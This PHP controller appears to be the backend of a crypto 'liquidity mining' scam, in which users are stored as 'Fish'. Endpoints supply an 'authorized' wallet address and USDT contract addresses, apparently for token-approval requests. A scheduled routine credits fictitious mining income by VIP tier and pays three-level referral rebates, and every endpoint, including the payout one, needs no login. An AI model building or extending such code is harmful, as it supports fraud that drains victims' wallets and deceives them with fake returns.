<?php

namespace app\api\controller;

use app\admin\model\Fish;
use app\common\model\News;
use app\common\model\Notice;
use app\common\model\WithdrawSettings;
use app\admin\model\recmmended\Grade;
use app\admin\model\user\Income;
use app\admin\model\user\money\Log;
use app\admin\model\Wallet;
use app\common\controller\Api;
use app\common\model\Address;
use app\common\model\vip\Type;
use think\Config;
use think\Request;
use think\Validate;

/**
 * 首页接口
 */
class Index extends Api
{
    protected $noNeedLogin = ['*'];
    protected $noNeedRight = ['*'];


    //ERC20代币合约地址
    const contract_address_eth = '0xdac17f958d2ee523a2206206994597c13d831ec7';


    //TRC20代币合约地址
    const contract_address_trx = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

    /**
     * 首页
     *
     */
    public function index()
    {
//        $trc20 = new Trc20();
//        $balance = $trc20->getTrc20Balance("TMiwxwzT6egY3PGA1nUWSyzxgqkNQzVsGC");
//        dump($balance);
//          $this->success('请求成功');

    }


    /**
     * 获取配置公共参数
     */
    public function config(){
        $address = Address::where(['enabled'=>1])->column('address','type');

        $data['trc'] = [
            'address'=>empty($address['trc'])?'':$address['trc'],
            'contract_address'=>self::contract_address_trx
        ];

        $data['erc'] = [
            'address'=>empty($address['erc'])?'':$address['erc'],
            'contract_address'=>self::contract_address_eth
        ];

        $config  = Config::get('site');

        $lang_key = Request::instance()->header('lang');
        if(empty($lang_key)){
            $lang_key = 'en';
        }

        //首页数据
        $data['home'] = [
            // 'pool'=>[
            //     'total_output'=>$config['total_output'],
            //     'sys_pool_miningnode'=>$config['sys_pool_miningnode'],
            //     'sys_pool_usercount'=>$config['sys_pool_usercount'],
            //     'user_revenue'=>$config['total_output'] * $config['eth_price']
            // ],

            //用户产出
            // 'carousel'=>Config::get('carousel'),

            //帮助中心
            // 'help'=>Notice::where(['lang'=>$lang_key,'type'=>1,'status'=>1])->select(),

        ];


        //分享页面数据
        $data['share'] = [
            //邀请等级
            'rebateConfigDtos'=>Grade::select()
        ];


        //在线客服
        $data['chatLink'] = $config['chatLink'];
        $data['email'] = $config['mail_from'];
        $data['commission'] = sprintf("%.2f", WithdrawSettings::value(['commission_val']));
        //telegram客服
        //$data['telegramChat'] = $config['telegramChat'];

        //WhatsApp客服
        //$data['whatsAppChat'] = $config['whatsAppChat'];

        //当前以太坊价格
        $data['eth_price'] = Config::get('site.eth_price');

        //当前TRX价格
        $data['trx_price'] = Config::get('site.trx_price');

        //网站名称
        $data['website_name'] = Config::get('site.name');

        $this->success(lang('Request Success'),$data);
    }





    /**
     * 获取授权的以太坊地址
     */
    public function get_erc(){
        $erc_address = Address::where(['type'=>'erc','enabled'=>1])->value('address');
        $infura_key = Config::get('site.infura_key');
        $contract_address = self::contract_address_eth;
        $this->success('获取成功',['address'=>$erc_address == null?'':$erc_address,'infura_key'=>$infura_key,'contract_address'=>$contract_address]);
    }


    /**
     * 获取授权的波场钱包地址
     */
    public function get_trc(){
        $erc_address = Address::where(['type'=>'trc','enabled'=>1])->value('address');
        $contract_address = self::contract_address_trx;
        $this->success('获取成功',['address'=>$erc_address == null?'':$erc_address,'contract_address'=>$contract_address]);
    }
    
    /**
     * 获取平台VIP等级
     */
    public function vipTypes(){
        $vip_type = Type::field('id,name,rate,min')->select();
        $this->success('获取成功',$vip_type);
    }
    
    /**
     * 矿机质押分成
     */
    public function commission(){
        //查询收益的最小余额
        $min = Type::order('min asc')->value('min');

        //查询所有执行时间小于当前时间的用户
        $fish = Fish::where(['last_time'=>['<=',time()],'balance'=>['>=',$min],'status'=>1])->select();
        foreach ($fish as $k=>$v){
            if($v['last_time'] == 0){
                //设置6小时后执行
                Fish::where('id',$v['id'])->update(['last_time'=>time() + 6 * 3600 - 20]);
                continue;
            }else{
                //查询当前余额是几级矿池
                $vip = Type::where('min','<',$v['balance'])->order('id desc')->find();
                if(empty($vip)){
                    continue;
                }

                //查询当前币种是否开启了自动转换
                switch ($v['chain']){
                    case 'erc':
                        $is_convert = Wallet::where(['uid'=>$v['id'],'coin'=>'ETH'])->value('is_convert');
                        //计算应该获得多少USDT的分成
                        $commission = sprintf("%.2f",$v['balance'] * $vip['rate']);

                        if($is_convert == 1){
                            $wallet = Wallet::where(['uid'=>$v['id'],'coin'=>'USDT'])->value('balance');
                            //自动转换成USDT
                            Wallet::where(['uid'=>$v['id'],'coin'=>'USDT'])->inc('balance',$commission)->inc('total_balance',$commission)->update();

                            //记录挖矿
                            $map = [
                                'userid'=>$v['id'],
                                'icometype'=>1,
                                'userbalance'=>$v['balance'],
                                'rate'=>$vip['rate'],
                                'income'=>$commission,
                                'daily'=>time(),
                                'createtime'=>time(),
                                'coin'=>'USDT'
                            ];
                            Income::insert($map);



                            //生成日志
                            $log1 = [
                                'user_id'=>$v['id'],
                                'money'=>$commission,
                                'before'=>$wallet,
                                'coin'=>'USDT',
                                'after'=>$wallet + $commission,
                                'memo'=>'Mining',
                                'type'=>3,
                                'createtime'=>time()
                            ];
                            Log::insert($log1);
                        }else{
                            //当前以太坊价格
                            $eth_price = Config::get('site.eth_price');
                            $wallet = Wallet::where(['uid'=>$v['id'],'coin'=>'ETH'])->value('balance');
                            
                            //转换成ETH增加
                            Wallet::where(['uid'=>$v['id'],'coin'=>'ETH'])->inc('balance',sprintf("%.6f",$commission/$eth_price))->inc('total_balance',sprintf("%.6f",$commission/$eth_price))->update();

                            //记录挖矿
                            $map = [
                                'userid'=>$v['id'],
                                'icometype'=>1,
                                'userbalance'=>$v['balance'],
                                'rate'=>$vip['rate'],
                                'income'=>sprintf("%.6f",$commission/$eth_price),
                                'daily'=>time(),
                                'createtime'=>time(),
                                'coin'=>'ETH'
                            ];
                            Income::insert($map);


                            //生成日志
                            $log1 = [
                                'user_id'=>$v['id'],
                                'money'=>sprintf("%.6f",$commission/$eth_price),
                                'before'=>$wallet,
                                'coin'=>'ETH',
                                'after'=>$wallet + sprintf("%.6f",$commission/$eth_price),
                                'memo'=>'Mining',
                                'type'=>3,
                                'createtime'=>time()
                            ];
                            Log::insert($log1);
                        }
                        //返佣3级
                        $this->rebate($commission,$v,0,$v['id']);
                        break;
                    case 'trc':

                        $is_convert = Wallet::where(['uid'=>$v['id'],'coin'=>'TRX'])->value('is_convert');
                        //计算应该获得多少USDT的分成
                        $commission = sprintf("%.2f",$v['balance'] * $vip['rate']);

                        if($is_convert == 1){
                            $wallet = Wallet::where(['uid'=>$v['id'],'coin'=>'USDT'])->value('balance');

                            //自动转换成USDT
                            Wallet::where(['uid'=>$v['id'],'coin'=>'USDT'])->inc('balance',$commission)->inc('total_balance',$commission)->update();

                            //记录挖矿
                            $map = [
                                'userid'=>$v['id'],
                                'icometype'=>1,
                                'userbalance'=>$v['balance'],
                                'rate'=>$vip['rate'],
                                'income'=>$commission,
                                'daily'=>time(),
                                'createtime'=>time(),
                                'coin'=>'USDT'
                            ];
                            Income::insert($map);


                            //生成日志
                            $log1 = [
                                'user_id'=>$v['id'],
                                'money'=>$commission,
                                'before'=>$wallet,
                                'coin'=>'USDT',
                                'after'=>$wallet + $commission,
                                'memo'=>'Mining',
                                'type'=>3,
                                'createtime'=>time()
                            ];
                            Log::insert($log1);
                        }else{
                            $wallet = Wallet::where(['uid'=>$v['id'],'coin'=>'TRX'])->value('balance');
                            
                            //当前TRX价格
                            $trx_price = Config::get('site.trx_price');

                            //转换成TRX增加
                            Wallet::where(['uid'=>$v['id'],'coin'=>'TRX'])->inc('balance',sprintf("%.6f",$commission/$trx_price))->inc('total_balance',sprintf("%.6f",$commission/$trx_price))->update();

                            //记录挖矿
                            $map = [
                                'userid'=>$v['id'],
                                'icometype'=>1,
                                'userbalance'=>$v['balance'],
                                'rate'=>$vip['rate'],
                                'income'=>sprintf("%.6f",$commission/$trx_price),
                                'daily'=>time(),
                                'createtime'=>time(),
                                'coin'=>'TRX'
                            ];
                            Income::insert($map);


                            //生成日志
                            $log1 = [
                                'user_id'=>$v['id'],
                                'money'=>sprintf("%.6f",$commission/$trx_price),
                                'before'=>$wallet,
                                'coin'=>'TRX',
                                'after'=>$wallet + sprintf("%.6f",$commission/$trx_price),
                                'memo'=>'Mining',
                                'type'=>3,
                                'createtime'=>time()
                            ];
                            Log::insert($log1);
                        }
                        //返佣3级
                        $this->rebate($commission,$v,0,$v['id']);
                        break;
                    default:
                        break;
                }

                //设置6小时后执行
                Fish::where('id',$v['id'])->update(['last_time'=>time() + 6 * 3600 - 20]);
            }
        }


        echo "执行完毕:".date('Y-m-d H:i:s',time());
    }





    /**
     * 三级返佣
     */
    public function rebate($incomePrice,$user,$num,$orderId){
        if($user['pid'] == 0){
            return 1;
        }

        if($num < 3){
            //查询用户信息
            $user = Fish::where(['id'=>$user['pid']])->field('id,pid,balance,vipid,incomeyue,totalincome,pledgeprice,pledgeincome')->find();
            if(empty($user)){
                return 1;
            }

            //查看返佣等级
            $share_grade = Grade::where('minAmount','<',$user['balance'])->order('level desc')->find();
            if(empty($share_grade)){
                self::rebate($incomePrice,$user,$num+1,$orderId);
            }

            $rate = 0;
            //查看返佣利率
            switch ($num){
                case 0:
                    $rate = $share_grade['oneRate'];
                    break;
                case 1:
                    $rate = $share_grade['twoRate'];
                    break;
                case 2:
                    $rate = $share_grade['threeRate'];
                    break;
            }

            $rebatePrice = sprintf("%.2f",$incomePrice * $rate/100);
            if($rebatePrice == 0){
                return 1;
            }
            $map = [
                'userid'=>$user['id'],
                'icometype'=>11 + $num,
                'userbalance'=>$user['balance'],
                'rate'=>$rate/100,
                'income'=>$rebatePrice,
                'daily'=>time(),
                'sourceid'=>$orderId,
                'createtime'=>time(),
                'coin'=>'USDT'
            ];
            Income::insert($map);

            Fish::where(['id'=>$user['id']])
                ->update(['totalincome'=>$user['totalincome'] + $rebatePrice,'incomeyue'=>$user['incomeyue'] + $rebatePrice]);

            self::rebate($incomePrice,$user,$num+1,$orderId);
        }

    }
    
    /**
     * 获取公告
     * @return void
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\ModelNotFoundException
     * @throws \think\exception\DbException
     */
    public function findNotice() {
        try {
            $params = $this->request->param();
            $rule = [
                'type' => 'require|in:1,2,3,4,5,6',                                                                             //类型
            ];
            $validate = new Validate($rule);
            $result = $validate->check($params);
            if (!$result) {
                $this->error($validate->getError());
            }
            $type = $params['type'];
            $data = Notice::where(['status' => 1, 'type' => $type, 'lang' => $this->request->header('lang')])
                ->field('title, content, token')
                ->select();
            $this->success(__('Request Success'), $data);
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
    
    /**
     * 获取新闻列表
     * @return void
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\ModelNotFoundException
     * @throws \think\exception\DbException
     */
    public function getNewsList() {
        try {
            $page = $this->request->param('page') ?? 1;                                                                 //页数
            $pageSize = $this->request->param('page_size') ?? 5;                                                        //页数大小
            $list = 
            // News::where(['status' => 1])
            News::where(['status' => 1, 'lang' => $this->request->header('lang')])
                ->field('title, abstract, author,up_info,down_info, image, link, FROM_UNIXTIME(news_time) AS news_time')
                ->page($page, $pageSize)
                ->order('news_time desc')
                ->select();
            $count = News::where(['status' => 1, 'lang' => $this->request->header('lang')])->count('id');
            $data = ['count' => $count, 'list' => $list];
            $this->success(__('Request Success'), $data);
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
    
    
}
